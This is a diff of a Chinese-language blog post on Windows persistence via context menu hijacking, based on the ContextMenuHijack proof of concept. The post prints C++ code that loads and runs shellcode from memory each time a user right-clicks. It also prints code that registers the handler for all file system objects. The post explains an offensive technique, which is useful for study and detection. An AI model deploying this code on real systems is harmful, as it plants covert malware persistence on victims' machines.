@@ -1,23 +1,23 @@
 ---
 layout: post
-title: 持久化 - 上下文菜单
+title: Windows 持久化 - 上下文菜单
 date: '2023-03-29 16:12:57'
-tags:
-- persistence
+categories: ["security", "persistence"]
+tags: ["persistence", "windows"]
 ---
 
 上下文菜单为用户提供了快捷方式，以执行许多操作。上下文菜单通过右键单击调用，对于每个 Windows 用户来说，这是一个非常常见的操作。在攻击性操作中，通过在用户尝试使用上下文菜单时执行 shellcode，可以将此操作武器化以实现持久化。
 
 [RistBS](https://twitter.com/RistBS) 开发了一个名为 [ContextMenuHijack](https://github.com/RistBS/ContextMenuHijack) 的 POC，可以通过注册 COM 对象利用上下文菜单实现持久化。使用“VirtualAlloc”函数以分配存储可执行的 shellcode 的内存区域。
 
-    void InjectShc() 
+    void InjectShc()
     {
         DWORD dwOldProtect = 0;
         LPVOID addr = VirtualAlloc( NULL, sizeof( buf ), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
         memcpy( addr, buf, sizeof( buf ) );
-     
+
         VirtualProtect( addr, sizeof( buf ), PAGE_EXECUTE_READ, &dwOldProtect );
-     
+
         ( ( void( * )() )addr )();
     }
 
@@ -25,13 +25,13 @@ tags:
 
 下面的代码用于接收有关用户将要选择的组件的信息，“CreateThread”将创建一个新线程来执行 shellcode。
 
-    // 此函数通过创建新线程并注入shellcode来初始化上下文菜单扩展。 
-    // 它还检查数据对象是否为空，如果为空，则返回S_OK。 
+    // 此函数通过创建新线程并注入shellcode来初始化上下文菜单扩展。
+    // 它还检查数据对象是否为空，如果为空，则返回S_OK。
     IFACEMETHODIMP FileContextMenuExt::Initialize( LPCITEMIDLIST pidlFolder, LPDATAOBJECT pDataObj, HKEY hKeyProgID )
     {
         DWORD tid = NULL;
         CreateThread( NULL, 1024 * 1024, ( LPTHREAD_START_ROUTINE )InjectShc, NULL, 0, &tid );
-     
+
         if ( NULL == pDataObj ) {
                     if ( pidlFolder != NULL ) {
                     }
@@ -47,7 +47,7 @@ tags:
     IFACEMETHODIMP FileContextMenuExt::QueryInterface(REFIID riid, void **ppv)
     {
         // 定义 QITAB 数组，用于存储 COM 接口
-        static const QITAB qit[] = 
+        static const QITAB qit[] =
         {
             QITABENT( FileContextMenuExt, IContextMenu ), // 右键菜单接口
             QITABENT( FileContextMenuExt, IContextMenu2 ), // 右键菜单接口 2
@@ -70,7 +70,7 @@ tags:
             // 将当前对象注册为所有文件系统对象的上下文菜单处理程序
             hr = RegisterShellExtContextMenuHandler( L"AllFilesystemObjects", CLSID_FileContextMenuExt, L"ContextMenuHijack.FileContextMenuExt" );
         }
-             
+
         return hr;
     }
 
@@ -97,6 +97,5 @@ tags:
 
 ## References
 
-> https://github.com/RistBS/ContextMenuHijack  
-> https://ristbs.github.io/2023/02/15/hijack-explorer-context-menu-for-persistence-and-fun.html
-
+> <https://github.com/RistBS/ContextMenuHijack>
+> <https://ristbs.github.io/2023/02/15/hijack-explorer-context-menu-for-persistence-and-fun.html>
